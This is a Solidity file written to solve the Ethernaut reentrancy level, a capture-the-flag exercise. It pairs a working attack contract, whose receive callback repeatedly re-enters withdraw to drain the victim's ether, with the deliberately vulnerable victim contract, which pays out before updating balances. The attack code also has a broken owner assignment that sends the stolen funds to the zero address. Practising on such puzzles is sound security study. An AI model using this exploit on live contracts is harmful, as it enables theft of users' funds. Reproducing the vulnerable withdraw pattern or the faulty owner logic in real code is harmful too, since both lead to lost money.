// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol';

/*
 * Used to solve level 10 (reentrancy) in Ethernaut. 
 * This is the first attack you hear about when studying ethereum. That being said, I do
 * need practice writing reentrancy attacks. To carry out this attack, construct with the
 * right amount of ethereum, then call attack. This isn't the most elegant solution, but it
 * gets the job done.
*/
contract ReentranceAttack {
    uint8 public receives = 0;
    uint prevBalance;
    Reentrance victim;
    address payable owner;

    constructor(Reentrance _victim) payable public {
      victim = _victim;
      prevBalance = address(victim).balance;
      owner = payable(owner);
      require(msg.value == prevBalance, "Send the victim's balance. No more, no less.");
    }

    receive() external payable {
      if(receives <= 0) {
        victim.withdraw(victim.balanceOf(address(this)));
      }
      receives++;
    }

    function attack() external {
      victim.donate{ value: prevBalance }(address(this));
      assert(victim.balanceOf(address(this)) == prevBalance);
      victim.withdraw(victim.balanceOf(address(this)));
    }

    function withdraw() external {
      owner.transfer(address(this).balance);
    }
}

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}